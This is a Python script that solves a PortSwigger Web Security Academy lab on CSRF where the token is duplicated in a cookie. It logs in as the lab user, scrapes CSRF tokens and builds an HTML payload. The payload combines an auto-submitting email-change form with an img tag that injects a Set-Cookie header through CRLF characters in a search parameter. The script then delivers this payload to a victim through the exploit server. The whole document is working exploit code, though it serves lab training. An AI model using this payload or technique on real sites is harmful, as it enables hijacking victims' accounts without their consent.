###################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 21/10/2023
#
# Lab: CSRF where token is duplicated in cookie
#
# Steps: 1. Fetch the login page
#        2. Extract the csrf token and session cookie
#        3. Login as wiener
#        4. Fetch wiener profile
#        5. Extract the csrf token that is needed for email update
#        6. Craft an HTML form for changing the email address that includes
#           the extracted csrf token and an img tag which is used to set the csrf
#           cookie via its src and submit the form via its error handler
#        7. Deliver the exploit to the victim
#        8. The victim's email will be changed after they trigger the exploit
#
###################################################################################


###########
# imports
###########
import requests
from colorama import Fore
import re

#########
# Main
#########

# change this to your lab URL
lab_url = "https://0a8900e20368d3af894bf9b1003b009e.web-security-academy.net"

# change this to your exploit server URL
exploit_server_url = "https://exploit-0aa700020340d3e78976f8dd01e70073.exploit-server.net"

# the header of your exploit sever response
exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    
try:  
    # fetch the login page
    login_page = requests.get(f"{lab_url}/login")

except:
    print(Fore.RED + "[!] Failed to fetch the login page through exception")
    exit(1) 

print(Fore.WHITE + "⦗1⦘ Fetching the login page.. " + Fore.GREEN + "OK")

# get session cookie
session = login_page.cookies.get("session")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

# set cookies
cookies = {
    "session": session,
    "csrf": csrf
}

print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie.. " + Fore.GREEN + "OK")

# set credentials
data = {
    "username": "wiener",
    "password": "peter",
    "csrf": csrf
}

try:    
    # login as wiener
    login = requests.post(f"{lab_url}/login", data, cookies=cookies, allow_redirects=False)
    
except:
    print(Fore.RED + "[!] Failed to login as wiener through exception")
    exit(1)

print(Fore.WHITE + "⦗3⦘ Logging in as wiener.. " + Fore.GREEN + "OK")

# get the new session
session = login.cookies.get("session")

# set session cookie
cookies = {
    "session": session
}

try:  
    # fetch wiener profile
    wiener = requests.get(f"{lab_url}/my-account", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch wiener profile through exception")
    exit(1)

print(Fore.WHITE + "⦗4⦘ Fetching wiener profile.. " + Fore.GREEN + "OK")

# extract the csrf token that is needed for email update
csrf = re.findall("csrf.+value=\"(.+)\"", wiener.text)[0]

print(Fore.WHITE + "⦗5⦘ Extracting the csrf token that is needed for email update.. " + Fore.GREEN + "OK")

# the new email
# you can change this to what you want
new_email = "hacked@you.com"

# payload to change the victim's email
payload = f"""<html>
                <body>
                <form action="{lab_url}/my-account/change-email" method="POST">
                    <input type="hidden" name="email" value="{new_email}" />
                    <input type="hidden" name="csrf" value="{csrf}" />
                    <input type="submit" value="Submit request" />
                </form>
                <img src="{lab_url}/?search=boo%0d%0aSet-Cookie: csrf={csrf}; SameSite=None" onerror=document.forms[0].submit()>
                </body>
            </html>"""

# data to send via POST
data = {
    "formAction": "DELIVER_TO_VICTIM",
    "urlIsHttps": "on",
    "responseFile": "/exploit",
    "responseHead": exploit_server_head,
    "responseBody": payload,
}

try:
    # deliver the exploit to the victim
    requests.post(exploit_server_url, data)

except:
    print(Fore.RED + "[!] Failed to deliver the exploit to the victim through exception")
    exit(1)

print(Fore.WHITE + "⦗6⦘ Delivering the exploit to the victim.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 The victim's email will be changed after they trigger the exploit") 
print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")



